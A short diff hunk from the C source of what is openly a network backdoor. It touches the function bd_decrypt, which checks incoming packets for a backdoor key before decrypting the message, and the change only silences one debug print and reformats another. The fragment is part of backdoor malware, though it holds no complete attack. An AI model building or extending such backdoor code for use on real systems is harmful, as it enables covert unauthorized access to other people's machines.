@@ -89,11 +89,11 @@ char *bd_decrypt(char *payload, int payload_len, char *encrypt_key){
     /* Check the packet for the key meant for the backdoor */
     
     if(strncmp(payload, BD_KEY, BD_KEY_LEN) != 0){
-        printf("Not for backdoor, discard.\n");
+        //printf("Not for backdoor, discard.\n");
         return NULL;
     }
     else
-        printf("Got message!\n");
+        printf("\nGot message!\n");
     
     /* Copy only encrypted portion of the payload to message */
     
